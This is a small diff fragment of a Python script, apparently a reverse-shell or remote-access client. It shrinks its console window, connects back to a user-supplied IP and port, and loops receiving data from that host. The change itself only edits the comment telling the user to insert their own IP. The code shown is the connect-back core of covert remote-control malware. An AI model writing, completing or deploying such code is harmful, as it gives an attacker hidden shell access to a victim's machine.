@@ -9,7 +9,7 @@ os.system("mode 14,1")
 
 def conexao():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Sockets
-    s.connect(('192.168.1.7', 8080)) # Change "192.168.1.7" for your ip
+    s.connect(('192.168.1.7', 8080)) # Change "192.168.1.7" 
 
     while (True):
         receber = s.recv(1024).decode()
